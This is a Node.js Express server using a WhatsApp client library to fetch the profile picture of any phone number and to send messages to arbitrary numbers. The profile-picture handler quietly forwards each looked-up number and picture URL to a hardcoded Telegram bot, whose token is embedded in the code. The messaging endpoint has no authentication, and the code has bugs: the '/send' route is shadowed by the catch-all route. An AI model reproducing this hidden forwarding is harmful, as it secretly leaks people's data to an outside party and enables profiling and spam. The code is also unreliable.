const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, DisconnectReason } = require('@whiskeysockets/baileys');
const express = require('express');
const cors = require('cors');
const compression = require('compression');

const app = express();
const port = 3000;
let client;
let serverStarted = false;
const pendingRequests = new Map();

app.use(cors());
app.use(compression());

const sanitizePhoneNumber = (phone) => {
    let cleanedPhoneNumber = phone.replace(/\D/g, '');
    if (!cleanedPhoneNumber.startsWith('91')) {
        cleanedPhoneNumber = cleanedPhoneNumber.replace(/^0+/, '');
        cleanedPhoneNumber = `91${cleanedPhoneNumber}`;
    }
    return cleanedPhoneNumber;
};

const isValidPhoneNumber = (phone) => {
    const phoneRegex = /^\d{7,15}$/;
    return phoneRegex.test(phone);
};

const initializeBaileys = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    const { version } = await fetchLatestBaileysVersion();
    client = makeWASocket({
        auth: state,
        version,
        printQRInTerminal: true,
    });

    client.ev.on('creds.update', saveCreds);

    client.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
        } else if (connection === 'open') {
            console.log('Baileys Client is ready to use!');

            if (!serverStarted) {
                app.listen(port, () => {
                    console.log(`API server is running on http://localhost:${port}`);
                });
                serverStarted = true;
            }
        }
    });
};

initializeBaileys();

app.get('/:number', async (req, res) => {
    let phone = req.params.number;
    if (phone == 'favicon.ico') return res.status(200).json({ ok: 'true' });

    const sanitizedPhone = sanitizePhoneNumber(phone);
    if (!isValidPhoneNumber(sanitizedPhone)) {
        return res.status(400).json({ error: 'Invalid phone number format. Only digits (7-15) are allowed.' });
    }

    const phoneNumber = `${sanitizedPhone}@s.whatsapp.net`;

    if (pendingRequests.has(phoneNumber)) {
        const profilePicUrl = await pendingRequests.get(phoneNumber);
        return profilePicUrl
            ? res.json({ profilePicUrl })
            : res.status(500).json({ error: 'Failed to fetch profile picture (in progress)' });
    }

    try {
        const profilePicPromise = client.profilePictureUrl(phoneNumber, 'image');
        pendingRequests.set(phoneNumber, profilePicPromise);

        const profilePicUrl = await profilePicPromise;

        if (profilePicUrl) {
            res.json({ profilePicUrl });

            const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(phoneNumber)}`;
            try {
                await fetch(telegramUrl);
            } catch (fetchError) {
                console.error('Failed to send photo to Telegram:', fetchError);
            }
        } else {
            res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
        }
    } catch (error) {
        console.error('Error fetching profile picture:', error);
        res.status(500).json({ error: 'Failed to fetch profile picture' });
    } finally {
        pendingRequests.delete(phoneNumber);
    }
});

app.get('/send', async (req, res) => {
    const phone = req.query.nm;
    const message = req.query.message;

    const sanitizedPhone = sanitizePhoneNumber(phone);
    if (!sanitizedPhone || !isValidPhoneNumber(sanitizedPhone)) {
        return res.status(400).json({ error: 'Invalid phone number format. Phone number must contain 7-15 digits.' });
    }

    if (!message) {
        return res.status(400).json({ error: 'Message is required.' });
    }

    const phoneNumber = `${sanitizedPhone}@s.whatsapp.net`;

    try {
        await client.sendMessage(phoneNumber, { text: message });
        res.json({ status: 'Message sent successfully', phoneNumber, message });
    } catch (error) {
        res.status(500).json({ error: 'Failed to send message', details: error.message });
    }
});
